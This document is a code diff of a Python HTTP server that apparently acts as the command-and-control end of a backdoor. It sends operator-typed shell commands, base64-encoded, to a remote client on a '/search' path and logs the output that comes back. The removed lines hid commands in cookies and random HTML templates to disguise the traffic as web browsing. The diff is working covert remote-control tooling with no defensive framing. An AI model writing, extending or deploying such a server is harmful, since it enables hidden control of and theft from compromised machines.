@@ -14,11 +14,18 @@ import sys
 import random
 
 # Config
-PORT = 443
+PORT = 8000
 CERT_FILE = '../server.pem'
 
+currEncodedCmd = ""
+logFileName = '../logs/logs.txt'
+
+log_file = ""
+
 class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
-	
+    
+
+
     # Custom headers
     def _set_headers(self):
         self.send_header("Cache-Control", "private, max-age=0")
@@ -28,74 +35,53 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         self.end_headers()
         
     # GET events
-    def do_GET(self):       
+    def do_GET(self):
+        global currEncodedCmd
+        global log_file        
         if self.path.startswith("/search"):
-            if initConn == False:
-                # If client say hello, then reply hello (first connection)
-                if base64.b64decode(self.headers['Cookie']) == "HELLO":
-                    print(Colors.GREEN + '[!] Connection established with ' + self.client_address[0] + "\n" + Colors.END)
-                    InitConn()          
-                    self.send_response(200)
-                    self._set_headers()
-                    cmd = 'HELLO'
-                    encodedCmd = str(base64.b64encode(cmd.encode("utf-8")))
-                    rndtemplate = random.choice([x for x in os.listdir("../templates") if os.path.isfile(os.path.join("../templates", x))])
-                    with open("../templates/" + rndtemplate, 'r') as file:
-                        outfile = file.read() + encodedCmd
-                    self.wfile.write(outfile)
-                else:   
-                    self.send_response(404)
-                    self._set_headers()
-                    self.wfile.write("Not found")
-            # Client ask for instructions
-            elif base64.b64decode(self.headers['Cookie']) == "ASK":
-                with open('search', 'r') as file:
-                    outfile = file.read()
-                self.send_response(200)
-                self._set_headers()
-                self.wfile.write(outfile)
-                if (wait == False):
-                    InitFile()
-            # Client reply with output
-            else:
-                resp = base64.b64decode(self.headers['Cookie'])
-                if resp == "EXIT OK":
-                    stop_server()
-                else:
-                    print(Colors.LIGHT_WHITE + "\n" + resp + Colors.END)
-                    InitFile()
-                    self.send_response(200)
-                    self._set_headers()                  
-                    with open('search', 'r') as file:
-                        outfile = file.read()
-                    self.wfile.write(outfile)
-                    CancelWait()
+            self.send_response(200)
+            self._set_headers()
+            self.wfile.write(currEncodedCmd)
+            log_file.write("Sent cmd: " + base64.b64decode(currEncodedCmd) + "\n")
+            log_file.flush()
+            currEncodedCmd = ""
         else:
             self.send_response(404)
             self._set_headers()
             self.wfile.write("Not found")
-    
-    # Save logs
-    log_file = open('../logs/logs.txt', 'w')
+
+        # Save logs
+
+
+
+    def do_POST(self): 
+        global log_file  
+        if self.path.startswith("/search"):
+            content_length = int(self.headers['Content-Length'])
+            resp = base64.b64decode(self.rfile.read(content_length))
+            if resp == "EXIT OK":
+                stop_server()
+            else:
+                print(resp)
+                log_file.write("Rcv resp: " + resp + "\n")
+                log_file.flush()
+                self.send_response(200)
+                self._set_headers()
+                CancelWait()
+        else:
+            self.send_response(404)
+            self._set_headers()
+            self.wfile.write("Not found")
+
+
     def log_message(self, format, *args):
-        self.log_file.write("%s - - [%s] %s\n" %(self.client_address[0],self.log_date_time_string(),format%args))
-        
-def InitConn():
-    global initConn
-    initConn = True
+        global log_file
+        log_file.write("%s - - [%s] %s\n" %(self.client_address[0],self.log_date_time_string(),format%args))
+        log_file.flush()
     
 def CancelWait():
     global wait
     wait = False
-
-# Choose random template file    
-def InitFile():
-    rndtemplate = random.choice([x for x in os.listdir("../templates") if os.path.isfile(os.path.join("../templates", x))])
-    with open("../templates/" + rndtemplate, 'r') as file:
-        template = file.read()
-    outfile = open("search", "w")
-    outfile.write(template)
-    outfile.close()
 
 class Colors:
     BLACK = "\033[0;30m"
@@ -146,33 +132,21 @@ def start_server():
 # Exit
 def stop_server():
     print(Colors.YELLOW + '[!] Exit' + Colors.END)
-    os.remove("search")
+    log_file.close()
     os._exit(1)
     
 if __name__ == '__main__':
-    # Init
-    initConn = False
-    wait = True
-    InitFile()
     try:
+        log_file = open(logFileName, 'a+') 
         # Start http server in separate thread
         daemon = threading.Thread(target=start_server)
         daemon.daemon = True
         daemon.start()
-        # Wait for first connection from client
-        while (initConn == False):
-            pass
+        print ""
         while True:
-            cmd = raw_input("Command> ")
             wait = True
-            print(Colors.BLUE + 'Awaiting response ...' + Colors.END) 
-            encodedCmd = str(base64.b64encode(cmd.encode("utf-8")))
-            rndtemplate = random.choice([x for x in os.listdir("../templates") if os.path.isfile(os.path.join("../templates", x))])
-            with open("../templates/" + rndtemplate, 'r') as file:
-                    template = file.read() + encodedCmd
-            outfile = open("search", "w")
-            outfile.write(template)
-            outfile.close()
+            currcmd = raw_input(">")
+            currEncodedCmd = str(base64.b64encode(currcmd.encode("utf-8")))
             # Wait for client's reply
             while (wait == True):
                 pass
